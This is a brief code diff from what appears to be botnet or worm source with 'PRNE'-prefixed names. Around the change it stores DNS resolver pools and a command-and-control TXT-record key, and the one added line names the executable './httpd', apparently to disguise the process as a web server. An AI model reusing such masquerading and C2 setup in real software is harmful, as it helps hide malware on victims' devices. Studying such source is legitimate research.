@@ -150,6 +150,7 @@ int main (void) {
 	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, PRNE_RESOLV_NS_POOL_IPV4);
 	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, PRNE_RESOLV_NS_POOL_IPV6);
 	add_cstr(PRNE_DATA_KEY_CNC_TXT_REC, PRNE_CNC_TXT_REC);
+	add_cstr(PRNE_DATA_KEY_EXEC_NAME, "./httpd");
 
 	pos += NB_PRNE_DATA_KEY * sizeof(uint16_t);
 
